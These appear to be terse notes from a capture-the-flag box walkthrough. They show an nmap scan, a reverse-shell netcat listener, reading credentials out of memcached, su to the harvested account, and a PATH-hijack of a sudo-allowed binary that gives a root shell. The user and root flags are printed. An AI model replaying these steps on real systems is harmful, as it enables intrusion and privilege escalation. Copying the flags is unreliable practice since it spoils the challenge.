![[Pasted image 20260924004835.png]]


```
nmap -sV -Pn 10.82.176.98         
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-23 11:35 -0400
Nmap scan report for 10.82.176.98
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.07 seconds
   
```


![[Pasted image 20260923214044.png]]


![[Pasted image 20260923214226.png]]

![[Pasted image 20260923214358.png]]


![[Pasted image 20260923214556.png]]


![[Pasted image 20260923215856.png]]




*dump database*

![[Pasted image 20260923215434.png]]

![[Pasted image 20260923215936.png]]



![[Pasted image 20260923220155.png]]




![[Pasted image 20260923220127.png]]


![[Pasted image 20260923221834.png]]


![[Pasted image 20260923222015.png]]


![[Pasted image 20260923222038.png]]


![[Pasted image 20260923231633.png]]


```
python -c 'import pty; pty.spawn("/bin/bash")'
```

user.txt
1a26a6d51c0172400add0e297608dec6


root.txt
f4e788f87cc3afaecbaf0f0fe9ae6ad7


```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.132.204] from (UNKNOWN) [10.81.154.206] 37832
Linux osboxes 4.15.0-132-generic #136~16.04.1-Ubuntu SMP Tue Jan 12 18:18:45 UTC 2021 i686 i686 i686 GNU/Linux
 13:08:11 up 34 min,  0 users,  load average: 0.13, 0.22, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ netstat -lptu
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 localhost:mysql         *:*                     LISTEN      -               
tcp        0      0 localhost:11211         *:*                     LISTEN      -               
tcp        0      0 *:ssh                   *:*                     LISTEN      -               
tcp        0      0 localhost:ipp           *:*                     LISTEN      -               
tcp        0      0 localhost:3010          *:*                     LISTEN      -               
tcp6       0      0 [::]:http               [::]:*                  LISTEN      -               
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      -               
tcp6       0      0 ip6-localhost:ipp       [::]:*                  LISTEN      -               
udp        0      0 *:mdns                  *:*                                 -               
udp        0      0 *:49959                 *:*                                 -               
udp        0      0 *:bootpc                *:*                                 -               
udp        0      0 *:ipp                   *:*                                 -               
udp6       0      0 [::]:mdns               [::]:*                              -               
udp6       0      0 [::]:41306              [::]:*                              -               
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@osboxes:/$ telnet localhost 11211            
telnet localhost 11211
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
^[[A
^[[A
ERROR
version
version
VERSION 1.4.25 Ubuntu
stats
stats
STAT pid 931
STAT uptime 2455
STAT time 1790183674
STAT version 1.4.25 Ubuntu
STAT libevent 2.0.21-stable
STAT pointer_size 32
STAT rusage_user 0.022301
STAT rusage_system 0.044603
STAT curr_connections 1
STAT total_connections 7
STAT connection_structures 2
STAT reserved_fds 20
STAT cmd_get 0
STAT cmd_set 25
STAT cmd_flush 0
STAT cmd_touch 0
STAT get_hits 0
STAT get_misses 0
STAT delete_misses 0
STAT delete_hits 0
STAT incr_misses 0
STAT incr_hits 0
STAT decr_misses 0
STAT decr_hits 0
STAT cas_misses 0
STAT cas_hits 0
STAT cas_badval 0
STAT touch_hits 0
STAT touch_misses 0
STAT auth_cmds 0
STAT auth_errors 0
STAT bytes_read 781
STAT bytes_written 230
STAT limit_maxbytes 67108864
STAT accepting_conns 1
STAT listen_disabled_num 0
STAT time_in_listen_disabled_us 0
STAT threads 4
STAT conn_yields 0
STAT hash_power_level 16
STAT hash_bytes 262144
STAT hash_is_expanding 0
STAT malloc_fails 0
STAT bytes 321
STAT curr_items 5
STAT total_items 25
STAT expired_unfetched 0
STAT evicted_unfetched 0
STAT evictions 0
STAT reclaimed 0
STAT crawler_reclaimed 0
STAT crawler_items_checked 0
STAT lrutail_reflocked 0
END
username
username
ERROR
get username
get username
VALUE username 0 4
Orka
END
get password
get password
VALUE password 0 15
OrkAiSC00L24/7$
END
exit
exit
ERROR
back
back
ERROR
^C

```


```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.132.204] from (UNKNOWN) [10.81.154.206] 37894
Linux osboxes 4.15.0-132-generic #136~16.04.1-Ubuntu SMP Tue Jan 12 18:18:45 UTC 2021 i686 i686 i686 GNU/Linux
 13:16:58 up 43 min,  0 users,  load average: 0.00, 0.03, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@osboxes:/$ su Orka
su Orka
Password: OrkAiSC00L24/7$

Orka@osboxes:/$ pwd
pwd
/
Orka@osboxes:/$ cd home
cd home
Orka@osboxes:/home$ ls
ls
lost+found  Orka
Orka@osboxes:/home$ cd Orka
cd Orka
Orka@osboxes:~$ ls
ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
Orka@osboxes:~$ cat user.txt
cat user.txt
1a26a6d51c0172400add0e297608dec6
Orka@osboxes:~$ sudo -l
sudo -l
[sudo] password for Orka: OrkAiSC00L24/7$

Matching Defaults entries for Orka on osboxes:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin
Orka@osboxes:~$ ls
ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
Orka@osboxes:~$ cd Desktop
cd Desktop
Orka@osboxes:~/Desktop$ ls
ls
bitcoin  transfer.py
Orka@osboxes:~/Desktop$ cd ..
cd ..
Orka@osboxes:~$ mv Desktop olddesktop
mv Desktop olddesktop
Orka@osboxes:~$ mkdir Desktop
mkdir Desktop
Orka@osboxes:~$ cp /usr/bash ./Desktop/bitcoin 
cp /usr/bash ./Desktop/bitcoin 
cp: cannot stat '/usr/bash': No such file or directory
Orka@osboxes:~$ sudo /home/Orka/Desktop/bitcoin
sudo /home/Orka/Desktop/bitcoin
[sudo] password for Orka: OrkAiSC00L24/7$

sudo: /home/Orka/Desktop/bitcoin: command not found
Orka@osboxes:~$ ls
ls
Desktop    Downloads  olddesktop  Public     user.txt
Documents  Music      Pictures    Templates  Videos
Orka@osboxes:~$ cd Desktop
cd Desktop
Orka@osboxes:~/Desktop$ ls
ls
Orka@osboxes:~/Desktop$ mv olddesktop Desktop
mv olddesktop Desktop
mv: cannot stat 'olddesktop': No such file or directory
Orka@osboxes:~/Desktop$ mv olddesktop Desktop 
mv olddesktop Desktop 
mv: cannot stat 'olddesktop': No such file or directory
Orka@osboxes:~/Desktop$ rmdir Desktop 
rmdir Desktop 
rmdir: failed to remove 'Desktop': No such file or directory
Orka@osboxes:~/Desktop$ rm -rf Desktop 
rm -rf Desktop 
Orka@osboxes:~/Desktop$ cd ..
cd ..
Orka@osboxes:~$ rm -rf Desktop 
rm -rf Desktop 
Orka@osboxes:~$ mv olddesktop Desktop
mv olddesktop Desktop
Orka@osboxes:~$ ls
ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
Orka@osboxes:~$ cd /usr/sbin
cd /usr/sbin
Orka@osboxes:/usr/sbin$ sudo /home/Orka/Desktop/bitcoin
sudo /home/Orka/Desktop/bitcoin
[sudo] password for Orka: OrkAiSC00L24/7$

Enter the password : OrkAiSC00L24/7$
OrkAiSC00L24/7$
Access Denied... 
Orka@osboxes:/usr/sbin$ echo $PATH
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
Orka@osboxes:/usr/sbin$ echo -e '#!/bin/bash\n/bin/bash' > python
echo -e '#!/bin/bash\n/bin/bash' > python
Orka@osboxes:/usr/sbin$ sudo -l
sudo -l
Matching Defaults entries for Orka on osboxes:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin
Orka@osboxes:/usr/sbin$ sudo /home/Orka/Desktop/bitcoin
sudo /home/Orka/Desktop/bitcoin
Enter the password : OrkAiSC00L24/7$
OrkAiSC00L24/7$
Access Denied... 
Orka@osboxes:/usr/sbin$ chmod +x /usr/sbin/python
sudo /home/Orka/Desktop/bitcoinchmod +x /usr/sbin/python
Orka@osboxes:/usr/sbin$ sudo /home/Orka/Desktop/bitcoin
<o /home/Orka/Desktop/bitcoinsudo /home/Orka/Desktop/bitcoin                 
sudo: /home/Orka/Desktop/bitcoinsudo: command not found
Orka@osboxes:/usr/sbin$ chmod +x /usr/sbin/python
chmod +x /usr/sbin/python
Orka@osboxes:/usr/sbin$ sudo /home/Orka/Desktop/bitcoin
sudo /home/Orka/Desktop/bitcoin
Enter the password : OrkAiSC00L24/7$
OrkAiSC00L24/7$
Access Denied... 
Orka@osboxes:/usr/sbin$ ls
ls
a2disconf              groupmod               remove-default-ispell
a2dismod               grpck                  remove-default-wordlist
a2dissite              grpconv                remove-shell
a2enconf               grpunconv              rfkill
a2enmod                grub-bios-setup        rmt
a2ensite               grub-install           rmt-tar
a2query                grub-macbless          rsyslogd
aa-exec                grub-mkconfig          rtcwake
aa-remove-unknown      grub-mkdevicemap       rtkitctl
aa-status              grub-probe             safe_finger
accept                 grub-reboot            saned
accessdb               grub-set-default       select-default-ispell
acpid                  guest-account          select-default-wordlist
addgnupghome           httxt2dbm              service
addgroup               iconvconfig            setvesablank
add-shell              install-docs           split-logfile
adduser                install-sgmlcatalog    sshd
alsactl                invoke-rc.d            tarcat
alsa-info.sh           ip6tables-apply        tcpd
anacron                ippusbxd               tcpdchk
apache2                iptables-apply         tcpdmatch
apache2ctl             irqbalance             tcpdump
apachectl              ispell-autobuildhash   thermald
apparmor_status        iucode_tool            toshsat1800-irdasetup
applygnupgdefaults     iucode-tool            try-from
aptd                   kerneloops             tunelp
arp                    laptop-detect          tzconfig
arpd                   ldattach               ufw
aspell-autobuildhash   lightdm                unity-greeter
avahi-autoipd          lightdm-session        update-alternatives
avahi-daemon           locale-gen             update-ca-certificates
biosdecode             logrotate              update-catalog
bluetoothd             lpadmin                update-cracklib
chat                   lpc                    update-default-aspell
check_forensic         lpinfo                 update-default-ispell
chgpasswd              lpmove                 update-default-wordlist
chpasswd               make-ssl-cert          update-dictcommon-aspell
chroot                 mkinitramfs            update-dictcommon-hunspell
cpgr                   mklost+found           update-fonts-alias
cppw                   ModemManager           update-fonts-dir
cracklib-check         mysqld                 update-fonts-scale
cracklib-format        netfilter-persistent   update-grub
cracklib-packer        NetworkManager         update-grub2
cracklib-unpacker      newusers               update-grub-gfxpayload
create-cracklib-dict   nfnl_osf               update-gsfontmap
cron                   nologin                update-icon-caches
cupsaccept             ownership              update-icon-caches.gtk2
cupsaddsmb             pam-auth-update        update-inetd
cups-browsed           pam_getenv             update-info-dir
cupsctl                pam_timestamp_check    update-initramfs
cupsd                  paperconfig            update-locale
cupsdisable            phpdismod              update-mime
cupsenable             phpenmod               update-passwd
cupsfilter             phpquery               update-pciids
cups-genppdupdate      pm-hibernate           update-rc.d
cupsreject             pm-powersave           update-usbids
delgroup               pm-suspend             update-xmlcatalog
deluser                pm-suspend-hybrid      upgrade-from-grub-legacy
dmidecode              popcon-largest-unused  usb_modeswitch
dnsmasq                popularity-contest     usb_modeswitch_dispatcher
dpkg-divert            pppconfig              usbmuxd
dpkg-preconfigure      pppd                   useradd
dpkg-reconfigure       pppdump                userdel
dpkg-statoverride      pppoeconf              usermod
e2freefrag             pppoe-discovery        uuidd
e4defrag               pppstats               validlocale
fdformat               pptp                   vbetool
filefrag               pptpsetup              vcstime
gconf-schemas          pwck                   vigr
genl                   pwconv                 vipw
getweb                 pwunconv               visudo
gnome-menus-blacklist  python                 vpddecode
groupadd               readprofile            zic
groupdel               reject
Orka@osboxes:/usr/sbin$ sudo /home/Orka/Desktop/bitcoin
sudo /home/Orka/Desktop/bitcoin
Enter the password : OrkAiSC00L24/7$
OrkAiSC00L24/7$
Access Denied... 
Orka@osboxes:/usr/sbin$ sudo /home/Orka/Desktop/bitcoin
sudo /home/Orka/Desktop/bitcoin
Enter the password : OrkAiSC00L24/7$
OrkAiSC00L24/7$
Access Denied... 
Orka@osboxes:/usr/sbin$ sudo /home/Orka/Desktop/bitcoin
sudo /home/Orka/Desktop/bitcoin
Enter the password : 

Access Denied... 
Orka@osboxes:/usr/sbin$ sudo /home/Orka/Desktop/bitcoin
sudo /home/Orka/Desktop/bitcoin
Enter the password : password
password
Access Granted...
                        User Manual:
Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
Amounts with more than one number will be stripped off! 
And Lastly, be careful, everything is logged :) 
Amount Of BitCoins : 423
423
root@osboxes:/usr/sbin# ls
ls
a2disconf              groupmod               remove-default-ispell
a2dismod               grpck                  remove-default-wordlist
a2dissite              grpconv                remove-shell
a2enconf               grpunconv              rfkill
a2enmod                grub-bios-setup        rmt
a2ensite               grub-install           rmt-tar
a2query                grub-macbless          rsyslogd
aa-exec                grub-mkconfig          rtcwake
aa-remove-unknown      grub-mkdevicemap       rtkitctl
aa-status              grub-probe             safe_finger
accept                 grub-reboot            saned
accessdb               grub-set-default       select-default-ispell
acpid                  guest-account          select-default-wordlist
addgnupghome           httxt2dbm              service
addgroup               iconvconfig            setvesablank
add-shell              install-docs           split-logfile
adduser                install-sgmlcatalog    sshd
alsactl                invoke-rc.d            tarcat
alsa-info.sh           ip6tables-apply        tcpd
anacron                ippusbxd               tcpdchk
apache2                iptables-apply         tcpdmatch
apache2ctl             irqbalance             tcpdump
apachectl              ispell-autobuildhash   thermald
apparmor_status        iucode_tool            toshsat1800-irdasetup
applygnupgdefaults     iucode-tool            try-from
aptd                   kerneloops             tunelp
arp                    laptop-detect          tzconfig
arpd                   ldattach               ufw
aspell-autobuildhash   lightdm                unity-greeter
avahi-autoipd          lightdm-session        update-alternatives
avahi-daemon           locale-gen             update-ca-certificates
biosdecode             logrotate              update-catalog
bluetoothd             lpadmin                update-cracklib
chat                   lpc                    update-default-aspell
check_forensic         lpinfo                 update-default-ispell
chgpasswd              lpmove                 update-default-wordlist
chpasswd               make-ssl-cert          update-dictcommon-aspell
chroot                 mkinitramfs            update-dictcommon-hunspell
cpgr                   mklost+found           update-fonts-alias
cppw                   ModemManager           update-fonts-dir
cracklib-check         mysqld                 update-fonts-scale
cracklib-format        netfilter-persistent   update-grub
cracklib-packer        NetworkManager         update-grub2
cracklib-unpacker      newusers               update-grub-gfxpayload
create-cracklib-dict   nfnl_osf               update-gsfontmap
cron                   nologin                update-icon-caches
cupsaccept             ownership              update-icon-caches.gtk2
cupsaddsmb             pam-auth-update        update-inetd
cups-browsed           pam_getenv             update-info-dir
cupsctl                pam_timestamp_check    update-initramfs
cupsd                  paperconfig            update-locale
cupsdisable            phpdismod              update-mime
cupsenable             phpenmod               update-passwd
cupsfilter             phpquery               update-pciids
cups-genppdupdate      pm-hibernate           update-rc.d
cupsreject             pm-powersave           update-usbids
delgroup               pm-suspend             update-xmlcatalog
deluser                pm-suspend-hybrid      upgrade-from-grub-legacy
dmidecode              popcon-largest-unused  usb_modeswitch
dnsmasq                popularity-contest     usb_modeswitch_dispatcher
dpkg-divert            pppconfig              usbmuxd
dpkg-preconfigure      pppd                   useradd
dpkg-reconfigure       pppdump                userdel
dpkg-statoverride      pppoeconf              usermod
e2freefrag             pppoe-discovery        uuidd
e4defrag               pppstats               validlocale
fdformat               pptp                   vbetool
filefrag               pptpsetup              vcstime
gconf-schemas          pwck                   vigr
genl                   pwconv                 vipw
getweb                 pwunconv               visudo
gnome-menus-blacklist  python                 vpddecode
groupadd               readprofile            zic
groupdel               reject
root@osboxes:/usr/sbin# cd ../../
cd ../../
root@osboxes:/# ls
ls
bin    dev   initrd.img      lost+found  opt   run   srv  usr      vmlinuz.old
boot   etc   initrd.img.old  media       proc  sbin  sys  var
cdrom  home  lib             mnt         root  snap  tmp  vmlinuz
root@osboxes:/# cd root
cd root
root@osboxes:/root# ls
ls
cache.php  root.txt  server.py  wordpress_admin.txt
root@osboxes:/root# cat root.txt
cat root.txt
f4e788f87cc3afaecbaf0f0fe9ae6ad7
root@osboxes:/root# ^C

```



